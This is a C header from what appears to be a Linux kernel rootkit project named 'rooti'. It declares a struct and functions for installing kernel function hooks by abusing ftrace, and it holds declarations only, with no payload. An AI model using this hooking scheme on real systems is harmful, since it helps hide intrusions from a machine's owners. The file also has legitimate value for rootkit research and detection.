#ifndef _ROOTI_HOOKING_FUNC_H
#define _ROOTI_HOOKING_FUNC_H

#include <linux/ftrace.h>
#include "../config.h"


#ifndef ROOTI_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Shorthand for initializing function hook objects
#define ROOTI_FUNC_HOOK(_name, _hook, _orig) \
{ \
    .name = (_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

// Represents a function hook achieved by abusing the ftrace framework.
struct rooti_func_hook {
    char *name;               // hooked function name
    void *func;               // pointer to hook function
    void *orig;               // pointer to the original function
    unsigned long addr;       // real memory address of the original function
    struct ftrace_ops ops;    // ftrace configuration
};

void rooti_install_inline_hook(struct rooti_func_hook *hook);
void rooti_uninstall_inline_hook(struct rooti_func_hook *hook);

int rooti_install_func_hook(struct rooti_func_hook *hook);
int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count);
void rooti_uninstall_func_hook(struct rooti_func_hook *hook);
void rooti_uninstall_func_hooks(struct rooti_func_hook *hooks, size_t count);

#endif